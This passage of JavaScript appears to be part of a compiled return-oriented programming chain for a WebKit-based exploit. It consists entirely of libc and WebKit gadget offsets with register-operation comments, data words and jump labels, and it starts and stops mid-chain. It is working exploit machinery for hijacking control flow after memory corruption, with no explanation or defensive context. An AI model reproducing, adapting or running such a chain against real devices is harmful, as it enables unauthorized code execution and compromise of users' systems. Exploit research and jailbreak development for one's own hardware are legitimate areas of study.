libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1627:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127488, //L1629
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1628:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+127576, //L1631
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127592, //L1632
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1631:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1632:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+127736, //L1636
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127704, //L1634
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+127720, //L1635
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+127808, //L1638
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+127864, //L1639
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1639:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+127944, //L1641
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1641:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1642:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1643:
db([37, 0]); // 0x25
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+128048, //L1644
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+128064, //L1645
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+128152, //L1647
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1647:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128208, //L1648
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1648:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128280, //L1651
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128336, //L1653
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1653:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1654:
libc_base+785097, //mov rsp, rbp ; pop rbp
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128488, //L1656
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1655:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+128576, //L1658
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128592, //L1659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1658:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1659:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+128736, //L1663
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128704, //L1661
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+128720, //L1662
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+128808, //L1665
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+128864, //L1666
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1666:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+128944, //L1668
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1668:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1669:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1670:
db([38, 0]); // 0x26
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+129048, //L1671
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129064, //L1672
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+129152, //L1674
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129208, //L1675
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1675:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129280, //L1678
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+129336, //L1680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129464, //L1682
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+129448, //L1681
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129560, //L1683
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129576, //L1684
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129688, //L1685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+129672, //L1686
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+129760, //L1687
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129864, //L1689
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+129848, //L1691
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1691:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L1689:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1690:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+129992, //L1694
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+129976, //L1693
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130088, //L1696
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1695:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130176, //L1698
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130192, //L1699
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+130328, //L1703
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130344, //L1704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130312, //L1702
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1701:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L1702:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130432, //L1705
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130448, //L1706
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+130600, //L1709
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+130632, //L1711
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+130584, //L1708
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130616, //L1710
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+130744, //L1714
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+130728, //L1713
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1712:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+206806,); //pop rdi
//L1713:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+130848, //L1716
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1715:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1716:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+130936, //L1718
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+130952, //L1719
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131040, //L1721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+131056, //L1722
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1722:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+131128, //L1725
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
//L1724:
db([12, 0]); // 0xc
set_gadget(libc_base+792472,); //pop rcx
//L1725:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+131288, //L1728
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131304, //L1729
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131272, //L1727
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131424, //L1731
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131440, //L1732
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131408, //L1730
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+131608, //L1734
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131624, //L1735
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+131592, //L1733
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+131728, //L1739
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+131792, //L1741
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+131776, //L1740
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1739:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1737:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1738:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L1740:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+131912, //L1742+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+131904, //L1742
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+131928, //L1742+24
ropchain+136048, //L1736
libc_base+793877, //pop rsi
ropchain+131984, //L1744
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1743:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1744:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132072, //L1746
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132088, //L1747
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1747:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+132224, //L1751
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132240, //L1752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132208, //L1750
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1749:
db([36, 0]); // 0x24
set_gadget(libc_base+206806,); //pop rdi
//L1750:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132328, //L1753
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132344, //L1754
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+132496, //L1757
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132528, //L1759
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+132480, //L1756
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132512, //L1758
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1757:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132600, //L1760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+132616, //L1761
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+132712, //L1763
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+132696, //L1762
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+132808, //L1765
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1764:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1765:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+132896, //L1767
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+132912, //L1768
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1768:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+133048, //L1772
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133064, //L1773
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133032, //L1771
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1770:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L1771:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+133152, //L1774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133168, //L1775
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+133320, //L1778
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133352, //L1780
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+133304, //L1777
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133336, //L1779
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1778:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133424, //L1781
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133440, //L1782
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133560, //L1784
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133576, //L1785
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133544, //L1783
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
